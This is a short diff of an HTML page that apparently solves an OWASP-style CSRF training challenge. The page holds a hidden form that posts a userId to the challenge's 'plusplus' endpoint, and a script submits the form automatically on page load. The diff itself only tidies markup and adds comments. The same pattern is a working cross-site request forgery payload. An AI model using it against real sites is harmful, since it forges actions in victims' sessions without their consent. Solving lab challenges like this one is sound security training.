@@ -2,9 +2,13 @@
 <html>
   <body>
     <form name="donneclef" action="https://owasp02.isc.heia-fr.ch/user/csrfchallengetwo/plusplus" method="post">
-      <input type="hidden" name='userId' value="e09f6e55ae53a2c37b93b5e307bc0207e08fa181">
-      <input type="submit"/> 
+      <input type="hidden" name="userId" value="e09f6e55ae53a2c37b93b5e307bc0207e08fa181">
+      <input type="submit" value="Click me if not redirected"/> 
     </form>
-    <script>document.donneclef.submit()</script>
+
+    <script>
+      // Automatically submit the form when the page loads
+      document.donneclef.submit();
+    </script>
   </body>
 </html>
